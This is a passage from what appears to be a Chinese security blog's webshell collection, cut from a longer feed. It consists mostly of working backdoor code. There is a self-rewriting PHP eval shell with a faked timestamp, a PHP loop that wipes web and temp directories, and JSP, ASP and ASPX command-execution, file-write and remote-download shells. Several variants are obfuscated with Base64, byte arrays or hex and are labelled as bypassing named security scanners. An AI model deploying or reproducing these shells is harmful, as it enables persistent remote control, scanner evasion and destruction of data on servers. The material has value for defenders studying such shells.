if(md5($_POST[&quot;pass&quot;])==&quot;cdd7b7420654eb16c1e1b748d5b7c5b8&quot;)&#123;@eval($_POST[\&#x27;Du1\&#x27;]);&#125;?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">system(<span class="string">&#x27;touch -m -d &quot;2014-10-31 13:50:11&quot; .shell.php&#x27;</span>);</span><br><span class="line">usleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="372a1b33f1178a24810b45076f907767"><a href="#372a1b33f1178a24810b45076f907767" class="headerlink" title="372a1b33f1178a24810b45076f907767"></a>372a1b33f1178a24810b45076f907767</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// çµ•ä¸–å¥½é¦¬</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1. write .htaccess to prevent any execution from web</span></span><br><span class="line"><span class="comment">2. rm every thing in web dir (/tmp dir  and  /var/tmp dir)</span></span><br><span class="line"><span class="comment">3. link flag to web path</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//config</span></span><br><span class="line"><span class="variable">$web_path</span> = <span class="string">&quot;/var/www/html/&quot;</span>;</span><br><span class="line"><span class="variable">$hash_1</span> = <span class="string">&quot;93ca52b2614926880c319db1ac5b1380&quot;</span>;</span><br><span class="line"><span class="variable">$flag_link</span> = <span class="variable">$web_path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$hash_1</span>.<span class="string">&quot;.png&quot;</span>;</span><br><span class="line"><span class="variable">$htaccess_file</span> = <span class="string">&#x27;.htaccess&#x27;</span>;</span><br><span class="line"><span class="variable">$flag_path</span> = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="variable">$htaccess</span> = <span class="string">&#x27;&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;</span></span><br><span class="line"><span class="string">Deny from all</span></span><br><span class="line"><span class="string">&lt;/FilesMatch&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">TRUE</span>) &#123;&#123;</span><br><span class="line">system(<span class="string">&#x27;rm -rf /var/tmp/.* /var/tmp/* /tmp/.* /tmp/*&#x27;</span>);</span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="variable">$web_path</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="string">&#x27;rm -rf&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&#x27;..&#x27;</span> &amp;&amp; <span class="variable">$file</span> != <span class="variable">$htaccess_file</span> &amp;&amp; <span class="variable">$file</span> != <span class="variable">$hash_1</span>.<span class="string">&quot;.png&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$res</span> . <span class="string">&#x27; &#x27;</span> .<span class="variable">$file</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">system(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$htaccess_file</span>)!==<span class="variable">$htaccess</span>) &#123;&#123; </span><br><span class="line">    system(<span class="string">&#x27;chmod +w &#x27;</span>.<span class="variable">$htaccess_file</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$htaccess_file</span>, <span class="variable">$htaccess</span>); </span><br><span class="line">    system(<span class="string">&#x27;chmod -w &#x27;</span>.<span class="variable">$htaccess_file</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line">system(<span class="string">&#x27;ln -s &#x27;</span>.<span class="variable">$flag_path</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$flag_link</span>);</span><br><span class="line">system(<span class="string">&#x27;chmod -w &#x27;</span>.<span class="variable">$flag_link</span>);</span><br><span class="line">usleep(<span class="number">5</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><h3 id="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h3><h4 id="æ— å›æ˜¾æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#æ— å›æ˜¾æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="æ— å›æ˜¾æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>æ— å›æ˜¾æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;Du1&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure><h4 id="æœ‰å›æ˜¾å¸¦å¯†ç éªŒè¯"><a href="#æœ‰å›æ˜¾å¸¦å¯†ç éªŒè¯" class="headerlink" title="æœ‰å›æ˜¾å¸¦å¯†ç éªŒè¯"></a>æœ‰å›æ˜¾å¸¦å¯†ç éªŒè¯</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;passwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;Du1&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="æŠŠå­—ç¬¦ä¸²ç¼–ç åå†™å…¥æŒ‡å®šæ–‡ä»¶"><a href="#æŠŠå­—ç¬¦ä¸²ç¼–ç åå†™å…¥æŒ‡å®šæ–‡ä»¶" class="headerlink" title="æŠŠå­—ç¬¦ä¸²ç¼–ç åå†™å…¥æŒ‡å®šæ–‡ä»¶"></a>æŠŠå­—ç¬¦ä¸²ç¼–ç åå†™å…¥æŒ‡å®šæ–‡ä»¶</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.FileOutputStream(request.getParameter(<span class="string">&quot;file&quot;</span>)).write(request.getParameter(<span class="string">&quot;str&quot;</span>).getBytes());%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;/&quot;</span>+request.getParameter(<span class="string">&quot;file&quot;</span>)).write(request.getParameter(<span class="string">&quot;str&quot;</span>).getBytes());%&gt;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="keyword">new</span> java.io.RandomAccessFile(request.getParameter(<span class="string">&quot;file&quot;</span>),<span class="string">&quot;rw&quot;</span>).write(request.getParameter(<span class="string">&quot;str&quot;</span>).getBytes()); %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%<span class="keyword">new</span> java.io.RandomAccessFile(application.getRealPath(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;/&quot;</span>+request.getParameter(<span class="string">&quot;f&quot;</span>),<span class="string">&quot;rw&quot;</span>).write(request.getParameter(<span class="string">&quot;c&quot;</span>).getBytes()); %&gt;</span><br></pre></td></tr></table></figure><h3 id="ä¸‹è½½è¿œç¨‹æ–‡ä»¶"><a href="#ä¸‹è½½è¿œç¨‹æ–‡ä»¶" class="headerlink" title="ä¸‹è½½è¿œç¨‹æ–‡ä»¶"></a>ä¸‹è½½è¿œç¨‹æ–‡ä»¶</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = <span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">&quot;url&quot;</span>)).openStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    java.io.ByteArrayOutputStream baos = <span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">new</span> java.io.FileOutputStream(request.getParameter(<span class="string">&quot;file&quot;</span>)).write(baos.toByteArray());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä¸‹è½½åˆ° web è·¯å¾„ä¸‹ï¼š</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = <span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">&quot;u&quot;</span>)).openStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    java.io.ByteArrayOutputStream baos = <span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;/&quot;</span>+ request.getParameter(<span class="string">&quot;f&quot;</span>)).write(baos.toByteArray());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="å…æ€-1"><a href="#å…æ€-1" class="headerlink" title="å…æ€"></a>å…æ€</h3><h4 id="å‘½ä»¤æ‰§è¡Œ-Jsp-bypass-Dç›¾-amp-ç™¾åº¦scanner"><a href="#å‘½ä»¤æ‰§è¡Œ-Jsp-bypass-Dç›¾-amp-ç™¾åº¦scanner" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ Jsp bypass Dç›¾ &amp; ç™¾åº¦scanner"></a>å‘½ä»¤æ‰§è¡Œ Jsp bypass Dç›¾ &amp; ç™¾åº¦scanner</h4><h5 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        BASE64Decoder decoder = <span class="keyword">new</span> BASE64Decoder();</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;</span>)));</span><br><span class="line">        Process e = (Process)</span><br><span class="line">                rt.getMethod(<span class="keyword">new</span> String(decoder.decodeBuffer(<span class="string">&quot;ZXhlYw==&quot;</span>)), String.class).invoke(rt.getMethod(<span class="keyword">new</span></span><br><span class="line">                        String(decoder.decodeBuffer(<span class="string">&quot;Z2V0UnVudGltZQ==&quot;</span>))).invoke(<span class="keyword">null</span>, <span class="keyword">new</span></span><br><span class="line">                        Object[]&#123;&#125;), request.getParameter(<span class="string">&quot;cmd&quot;</span>) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>  language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;));</span><br><span class="line">        Process e = (Process) rt.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span> &#125;), String.class).invoke(rt.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span> &#125;)).invoke(<span class="keyword">null</span>), request.getParameter(<span class="string">&quot;cmd&quot;</span>) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125;out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="HEX"><a href="#HEX" class="headerlink" title="HEX"></a>HEX</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;javax.xml.bind.DatatypeConverter&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        Class rt = Class.forName(<span class="keyword">new</span> String(DatatypeConverter.parseHexBinary(<span class="string">&quot;6a6176612e6c616e672e52756e74696d65&quot;</span>)));</span><br><span class="line">        Process e = (Process) rt.getMethod(<span class="keyword">new</span> String(DatatypeConverter.parseHexBinary(<span class="string">&quot;65786563&quot;</span>)), String.class).invoke(rt.getMethod(<span class="keyword">new</span> String(DatatypeConverter.parseHexBinary(<span class="string">&quot;67657452756e74696d65&quot;</span>))).invoke(<span class="keyword">null</span>), request.getParameter(<span class="string">&quot;cmd&quot;</span>) );</span><br><span class="line">        java.io.InputStream in = e.getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123; out.println(<span class="keyword">new</span> String(b)); &#125;out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h4 id="å†°è-Jsp-bypass-Dç›¾-amp-ç™¾åº¦scanner"><a href="#å†°è-Jsp-bypass-Dç›¾-amp-ç™¾åº¦scanner" class="headerlink" title="å†°è Jsp bypass Dç›¾ &amp; ç™¾åº¦scanner"></a>å†°è Jsp bypass Dç›¾ &amp; ç™¾åº¦scanner</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class="line">&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;</span><br><span class="line">&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">&quot;pass&quot;</span>)!=<span class="keyword">null</span>)&#123;String k=(<span class="string">&quot;&quot;</span>+UUID.randomUUID()).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;&quot;</span>).substring(<span class="number">16</span>);session.putValue(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">out.print(k);<span class="keyword">return</span>;&#125;</span><br><span class="line">Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">SecretKeySpec sec=<span class="keyword">new</span> SecretKeySpec((session.getValue(<span class="string">&quot;u&quot;</span>)+<span class="string">&quot;&quot;</span>).getBytes(),<span class="string">&quot;AES&quot;</span>);</span><br><span class="line"> c.init(<span class="number">2</span>,sec);</span><br><span class="line"> String uploadString= request.getReader().readLine();</span><br><span class="line"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(uploadString))).newInstance().equals(pageContext);%&gt;</span><br></pre></td></tr></table></figure><h3 id="åå°„è°ƒç”¨å¤–éƒ¨-Jar"><a href="#åå°„è°ƒç”¨å¤–éƒ¨-Jar" class="headerlink" title="åå°„è°ƒç”¨å¤–éƒ¨ Jar"></a>åå°„è°ƒç”¨å¤–éƒ¨ Jar</h3><p>ç›´æ¥ç”¨äº†æŸä½å¸ˆå‚…å®ç°äº†çš„è¿œç¨‹åŠ è½½ç±»ï¼Œæ”¹å¤©è‡ªå·±æ­ä¸€ä¸‹å§ã€‚</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=Class.forName(<span class="string">&quot;Load&quot;</span>,<span class="keyword">true</span>,<span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> java.net.URL[]&#123;<span class="keyword">new</span> java.net.URL(request.getParameter(<span class="string">&quot;u&quot;</span>))&#125;)).getMethods()[<span class="number">0</span>].invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;request.getParameterMap()&#125;)%&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•ï¼š<code>?u=http://javaweb.org/Cat.jar&amp;023=A</code></p><h3 id="å¤§ğŸ"><a href="#å¤§ğŸ" class="headerlink" title="å¤§ğŸ"></a>å¤§ğŸ</h3><p>å¤ªå¤§äº†ï¼Œä¸å¥½æ”¾ï¼Œä¸¢è‡ªå·±æœ¬åœ°äº†</p><h2 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h2><h3 id="ä¸€å¥è¯"><a href="#ä¸€å¥è¯" class="headerlink" title="ä¸€å¥è¯"></a>ä¸€å¥è¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;_&quot;)%&gt;</span><br><span class="line">&lt;%execute(request(&quot;Du1&quot;))%&gt;</span><br></pre></td></tr></table></figure><h3 id="ä¸€äº›ç®€å•Bypass"><a href="#ä¸€äº›ç®€å•Bypass" class="headerlink" title="ä¸€äº›ç®€å•Bypass"></a>ä¸€äº›ç®€å•Bypass</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%a&#x3D;request(&quot;Du1&quot;)%&gt;&lt;%eval a%&gt;</span><br><span class="line">&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;Du1&quot;))%&gt;</span><br><span class="line">&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;1&quot;&amp;&quot;-&quot;&amp;&quot;1&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;  &#x2F;&#x2F; å¯†ç ï¼š-2</span><br></pre></td></tr></table></figure><h2 id="ASPX"><a href="#ASPX" class="headerlink" title="ASPX"></a>ASPX</h2><h3 id="ä¸€å¥è¯-1"><a href="#ä¸€å¥è¯-1" class="headerlink" title="ä¸€å¥è¯"></a>ä¸€å¥è¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;Jscript&quot; validateRequest&#x3D;&quot;false&quot; %&gt;&lt;%Response.Write(eval(Request.Item[&quot;w&quot;],&quot;Du1&quot;));%&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€å­¦ä¹ å…¥é—¨-VulnHubè‡ªé—­ä¹‹æ—…</title>
      <link href="2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/"/>
      <url>2021/05/10/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8-VulnHub%E8%87%AA%E9%97%AD%E4%B9%8B%E6%97%85/</url>
      
